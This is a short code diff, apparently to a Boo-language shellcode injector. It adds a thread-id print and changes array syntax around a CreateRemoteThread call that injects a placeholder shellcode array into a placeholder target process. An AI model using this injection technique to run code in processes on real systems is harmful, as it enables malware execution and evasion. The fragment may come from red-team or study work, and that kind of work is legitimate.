@@ -42,8 +42,9 @@ public static def InjectRemote(sc as (byte), process as string):
 
     threadid as int = 0
     CreateRemoteThread(procHandle, 0, 0, resultPtr, 0, 0, threadid)
+    print "threadId = $threadid"
     print "Injected!"
 
 public static def Main():
-    shellcode = array(byte, [BYTES])
+    shellcode = array(byte, (BYTES))
     InjectRemote(shellcode, "PROCESS")
